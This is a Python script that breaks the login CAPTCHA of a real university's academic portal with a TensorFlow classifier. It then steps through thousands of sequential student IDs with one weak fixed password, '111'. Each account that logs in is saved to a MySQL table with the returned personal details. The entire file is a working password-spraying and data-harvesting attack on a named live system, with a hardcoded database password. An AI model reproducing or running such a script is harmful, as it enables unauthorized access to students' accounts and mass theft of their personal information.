# -*-coding:utf-8-*-

import urllib
import urllib2
import tensorflow as tf
from deal_code import dealcode
import numpy as np
import re
import MySQLdb
# 解决字符转换问题
import sys
import socket

'''数据收集主程序'''

'''使用MySQL收集'''

reload(sys)
sys.setdefaultencoding('utf-8')


# TensorFlow预测函数
def _tensorflow_predict_(feed_dict=None):
    if not feed_dict:
        print '没有输入数据集'
    else:
        predict = []
        results_sets = sess.run([y], feed_dict=feed_dict)
        results_y = results_sets[0]
        for i in results_y:
            loc = np.array([i])
            loc = np.where(loc == np.max(loc))
            loc = int(loc[1])
            if loc < 10:
                loc = loc + 48
            else:
                loc = loc + 65 - 10
            predict.append(chr(loc))
    return predict  # 训练事先处理好的样本


# 检查验证码是否错误
def _check_code_(input):
    find = re.findall('<span id="lbCheckCode" style="display:inline-block;width:100px;">(.*?)</span', input)
    find = find[0]
    print find
    if find == '':
        return True
    else:
        return False


# 检查是否正常登录
def _check_login_(input):
    find = re.findall('<DIV id="lbPrompt" ms_positioning="FlowLayout">(.*?)<br>(.*?)<br>(.*?)</DIV>', input)
    if len(find) == 0:
        return find
    find = list(find[0])
    for i in range(len(find)):
        find[i] = find[i].strip()
    return find


# 初始化Tensorflow框架
modulepath = '/home/luochong/PycharmProjects/LoginSimulation/module/model.ckpt-10000'

pixels2d = 13 * 13
label_classes = 36

sess = tf.InteractiveSession()

x = tf.placeholder(tf.float32, [None, pixels2d], name='x-input')
W = tf.Variable(tf.zeros([pixels2d, label_classes]), name='weights')
b = tf.Variable(tf.zeros([label_classes], name='bias'))
y_ = tf.placeholder(tf.float32, [None, label_classes], name='y-input')

with tf.name_scope('Wx_b'):
    y = tf.nn.softmax(tf.matmul(x, W) + b)

# Add summary ops to collect data
_ = tf.histogram_summary('weights', W)
_ = tf.histogram_summary('biases', b)
_ = tf.histogram_summary('y', y)

with tf.name_scope('xent'):
    cross_entropy = -tf.reduce_sum(
        y_ * tf.log(tf.clip_by_value(y, 1e-10, 1.0)))  # y --> tf.clip_by_value(y, 1e-10, 1.0)
    _ = tf.scalar_summary('cross entropy', cross_entropy)
with tf.name_scope('train'):
    train_step = tf.train.GradientDescentOptimizer(0.01).minimize(cross_entropy)

with tf.name_scope('test'):
    correct_prediction = tf.equal(tf.argmax(y, 1), tf.argmax(y_, 1))
    accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
    _ = tf.scalar_summary('accuracy', accuracy)

sess.run(tf.initialize_all_variables())

saver = tf.train.Saver()
saver.restore(sess, modulepath)

# 连接MySQL数据库
db = MySQLdb.connect(host='localhost', user='root', passwd='luochong', db='yangtzeu_StuInfo')
db.set_character_set('utf8')
# 获取操作游标
cursor = db.cursor()
cursor.execute('SET NAMES utf8;')
cursor.execute('SET CHARACTER SET utf8;')
cursor.execute('SET character_set_connection=utf8;')

# 长江大学教务处地址 o(￣ヘ￣o#)
YUpath = 'http://jwc2.yangtzeu.edu.cn:8080'
# 验证码地址
YUCodepath = 'http://jwc2.yangtzeu.edu.cn:8080/verifycode.aspx'
# 验证码存储路径
path = '/home/luochong/PycharmProjects/LoginSimulation/TrainPicture/'
# Cookie路径
cookiepath = '/home/luochong/PycharmProjects/LoginSimulation/Cookie/'
# 账号信息
VIEWSTATE = ''
EVENTVALIDATION = ''
Uid = 200904809
Pwd = '111'
selectKind = '1'
code = ''
while True:
    print '当前学生号：%s' % Uid
    # 消息头
    send_Headers = {'Host': 'jwc2.yangtzeu.edu.cn:8080',
                    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Cookie': 'ASP.NET_SessionId=gslbpdfie1a2kyvds03rmycs',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'}
    try:
        response = urllib2.urlopen(YUpath, timeout=2)
    except urllib2.URLError:
        print '超时，重新连接...'
        continue
    except socket.timeout:
        print '超时，重新连接...'
        continue
    try:
        response = response.read().decode('gbk')
    except socket.timeout:
        print '超时，重新连接...'
        continue
    # 获取asp.net参数
    VIEWSTATE = re.findall(r'<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />', response)
    VIEWSTATE = VIEWSTATE[0]

    EVENTVALIDATION = re.findall(
        r'<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*?)" />', response)
    EVENTVALIDATION = EVENTVALIDATION[0]
    # 下载图片
    Check_Success = False
    while not Check_Success:
        req = urllib2.Request(YUCodepath, headers=send_Headers)
        try:
            codeimg = urllib2.urlopen(req, timeout=2)
        except urllib2.URLError:
            print '超时，重新连接...'
            continue
        except socket.timeout:
            print '超时，重新连接...'
            continue
        # 返回网页转换为'gbk'编码
        try:
            with open(path + 'checkPic_YU.jpeg', 'wb') as code:
                code.write(codeimg.read())
        except socket.timeout:
            continue
        # 识别验证码
        dc = dealcode()
        img, results = dc._deal_image_()
        imgdata = dc._get_image_(results)
        code = ''.join(_tensorflow_predict_({x: imgdata}))
        print code
        # print code
        # 更改消息头
        send_Headers.update({'Referer': 'http://jwc2.yangtzeu.edu.cn:8080/'})
        # 表单参数

        form_Datas = {
            '__VIEWSTATE': VIEWSTATE,
            '__EVENTVALIDATION': EVENTVALIDATION,
            'txtUid': str(Uid),
            'btLogin': 'µÇÂ¼',
            'txtPwd': Pwd,
            'selKind': selectKind,
            'txtCheckCode': code}
        # 格式化表单参数
        form_Datas = urllib.urlencode(form_Datas)
        # 生成包含消息头和表单参数的请求
        req = urllib2.Request(YUpath, data=form_Datas, headers=send_Headers)
        # 设置超时时间10s
        try:
            html = urllib2.urlopen(req, timeout=2)
        except urllib2.URLError:
            print '超时，重新连接...'
            continue
        except socket.timeout:
            print '超时，重新连接...'
            continue
        # 返回网页转换为'gbk'编码
        try:
            html = html.read().decode('gbk')
        except socket.timeout:
            print '超时，重新连接...'
            continue
        Check_Success = _check_code_(html)
    print '验证码通过！'
    data = _check_login_(html)
    if len(data) == 0:
        # 说明密码错误
        Uid += 1
        continue
    else:
        sql = 'INSERT INTO Student_2009 VALUES(%s,%s,%s,%s)'
        try:
            cursor.execute(sql, (Uid, Pwd, data[1], data[2]))
            db.commit()
            print '成功写入数据库！数据：%s %s %s %s' % (Uid, Pwd, data[1], data[2])
        except:
            print '写入数据库失败...数据：%s %s %s %s' % (Uid, Pwd, data[1], data[2])
            db.rollback()
    # 继续搜索
    Uid += 1
    if Uid > 200909999:
        print '搜索完毕 →_→'
        break
db.close()
